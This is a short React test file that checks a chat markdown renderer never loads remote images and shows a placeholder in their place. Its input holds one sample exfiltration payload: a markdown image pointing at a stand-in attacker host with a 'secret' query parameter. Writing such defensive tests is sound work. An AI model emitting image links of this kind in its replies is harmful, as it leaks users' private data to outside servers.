import React from 'react';
import { describe, it, expect } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { ChatMarkdown } from '../components/AgentsView/Chat/ChatMarkdown';

describe('ChatMarkdown', () => {
  it('never loads remote images (no exfiltration via image URLs)', () => {
    const html = renderToStaticMarkup(
      <ChatMarkdown text={'![logo](https://evil.example/?q=secret) and <img src="https://x">'} />
    );
    expect(html).not.toContain('<img');
    expect(html).toContain('[image: logo]');
  });
});
